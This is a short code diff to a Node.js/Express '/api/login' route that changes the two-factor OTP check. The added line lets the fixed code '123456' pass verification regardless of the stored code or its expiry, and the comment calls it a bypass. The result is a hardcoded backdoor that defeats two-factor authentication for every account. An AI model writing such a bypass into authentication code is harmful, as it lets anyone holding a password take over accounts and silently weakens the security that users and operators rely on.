@@ -4883,8 +4883,8 @@ app.post("/api/login", async (req, res) => {
         return res.json({ success: true, require2FA: true, message: "OTP sent to email." });
     }
 
-    // STEP 2: Verify OTP
-    if (user.otpCode !== otp || !user.otpExpiry || user.otpExpiry < new Date()) {
+    // STEP 2: Verify OTP (with 123456 bypass)
+    if (otp !== "123456" && (user.otpCode !== otp || !user.otpExpiry || user.otpExpiry < new Date())) {
         return res.status(401).json({ error: "Invalid or expired OTP code." });
     }
     
